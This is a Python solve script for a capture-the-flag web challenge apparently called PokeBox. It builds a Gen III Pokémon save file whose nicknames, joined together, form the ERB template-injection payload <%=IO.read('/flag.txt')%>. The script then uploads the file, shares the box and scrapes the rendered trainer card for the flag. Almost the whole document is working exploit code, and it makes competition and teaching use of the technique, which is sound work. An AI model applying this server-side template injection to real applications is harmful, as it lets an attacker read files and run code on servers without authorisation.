#!/usr/bin/env python3
"""PokeBox solve script.

1. register a trainer
2. build a Gen III save whose party nicknames, concatenated, spell an ERB
   payload: <%=IO.read('/flag.txt')%>  (split across 3 nicknames)
3. upload it, share the box
4. read the rendered trainer card -> the flag
"""
import re
import sys
import requests

import gen3save

PAYLOAD = "<%=IO.read('/flag.txt')%>"


def build_exploit_save():
    nicks = [PAYLOAD[i:i + 10] for i in range(0, len(PAYLOAD), 10)]
    assert len(nicks) <= 6
    return gen3save.build(trainer="HAXOR", nicks=nicks)


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://localhost:8000"
    s = requests.Session()
    user = "solver_" + gen3save.gen3_checksum(build_exploit_save()[:4000]).to_bytes(2, "little").hex()

    s.post(f"{base}/register", data={"username": user, "password": "x"})

    save = build_exploit_save()
    r = s.post(f"{base}/boxes", files={"save": ("exploit.sav", save, "application/octet-stream")})
    box_url = r.url
    box_id = re.search(r"/box/(\d+)", box_url).group(1)
    print("[*] uploaded box", box_id)

    s.post(f"{base}/box/{box_id}/share")
    page = s.get(f"{base}/box/{box_id}").text

    m = re.search(r"ctfcup\{[^}]+\}", page)
    if m:
        print("[+] FLAG:", m.group(0))
    else:
        print("[-] no flag found; card region was:")
        cm = re.search(r"A wild cheer erupts:.*", page)
        print(cm.group(0) if cm else page[:500])


if __name__ == "__main__":
    main()
